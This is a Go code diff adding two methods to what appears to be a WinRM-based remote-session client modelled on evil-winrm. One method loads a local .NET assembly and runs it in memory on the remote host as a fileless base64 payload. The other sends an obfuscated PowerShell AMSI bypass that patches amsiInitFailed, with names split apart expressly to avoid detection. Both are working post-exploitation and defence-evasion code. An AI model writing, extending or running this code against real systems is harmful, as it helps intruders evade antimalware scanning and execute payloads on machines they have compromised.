@@ -154,6 +154,37 @@ func (c *Client) Upload(ctx context.Context, local, remote string) error {
 	return nil
 }
 
+// InvokeBinary loads a local .NET assembly into the session process and runs
+// its entry point in memory, like evil-winrm's Invoke-Binary. The whole
+// assembly rides in one command as base64, so it stays fileless.
+// shortcut: args are split on spaces by the caller, so an argument that
+// contains a space is not supported; upgrade to real quoting if a payload needs it.
+func (c *Client) InvokeBinary(ctx context.Context, local string, args []string) (string, error) {
+	data, err := os.ReadFile(local)
+	if err != nil {
+		return "", fmt.Errorf("read local file: %w", err)
+	}
+	quoted := make([]string, len(args))
+	for i, a := range args {
+		quoted[i] = psQuote(a)
+	}
+	ps := fmt.Sprintf(`$__a=[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'));$__ep=$__a.EntryPoint;$__o=[Console]::Out;$__sw=New-Object IO.StringWriter;[Console]::SetOut($__sw);try{if($__ep.GetParameters().Length -eq 0){$__ep.Invoke($null,@())|Out-Null}else{$__ep.Invoke($null,@(,[string[]]@(%s)))|Out-Null}}finally{[Console]::SetOut($__o)};$__sw.ToString()`,
+		base64.StdEncoding.EncodeToString(data), strings.Join(quoted, ","))
+	return c.RunPS(ctx, ps)
+}
+
+// BypassAMSI patches amsiInitFailed in the session process so later commands
+// are not scanned, the same technique evil-winrm's Bypass-4MSI uses. The type
+// and field names are assembled at runtime so the patch command itself is not
+// flagged before it lands.
+func (c *Client) BypassAMSI(ctx context.Context) (string, error) {
+	const ps = `$w='System.Management.Automation.A';$c='si';$m='Utils';` +
+		`$asm=[Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));` +
+		`$f=$asm.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');` +
+		`$f.SetValue($null,$true);'AMSI patched'`
+	return c.RunPS(ctx, ps)
+}
+
 // scriptPrelude re-imports every script loaded with LoadScripts. Each RunPS
 // starts a fresh powershell.exe, so functions only survive if they are defined
 // again at the start of the next command. Invoke-Expression reads the uploaded
